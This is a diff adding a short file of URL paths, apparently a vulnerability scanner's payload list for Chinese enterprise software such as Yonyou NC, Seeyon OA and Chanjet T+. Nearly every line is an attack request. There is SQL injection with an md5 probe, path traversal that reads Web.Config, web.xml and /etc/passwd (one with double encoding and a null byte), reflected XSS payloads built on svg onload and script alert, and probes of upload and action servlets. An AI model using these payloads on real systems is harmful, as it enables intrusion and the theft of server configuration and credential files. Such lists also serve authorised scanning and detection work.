@@ -1,0 +1,17 @@
+/common/dept.jsp?deptid=1
+/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{num}}))
+/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config
+/service/~baseapp/UploadServlet
+/portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml
+/iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.png.js
+/login.jsp?onlyOnePerVM=hebing%27%3E%3Csvg%20onload=alert(document.domain)%3E
+/login.jsp?redirect=hebing%27%3E%3Csvg%20onload=alert(document.domain)%3E
+/login.jsp?nodeid=hebing%27%3E%3Csvg%20onload=alert(document.domain)%3E
+/index.jsp
+/menu.jsp?flag=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/help/systop.jsp?langcode=1%22%3E%3Csvg%20onload=alert(document.domain)%3E
+/help/systop.jsp?langcode=1%22%3E%3C/script%3E%3Csvg%20onload=alert(document.domain)%3E
+/help/top.jsp?langcode=1%22%3E%3Csvg%20onload=alert(document.domain)%3E
+/help/top.jsp?langcode=1%22%3E%3C/script%3E%3Csvg%20onload=alert(document.domain)%3E
+/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../
+/service/~iufo/com.ufida.web.action.ActionServlet?TableSelectedID&TreeSelectedID&action=nc.ui.iufo.release.InfoReleaseAction&method=createBBSRelease
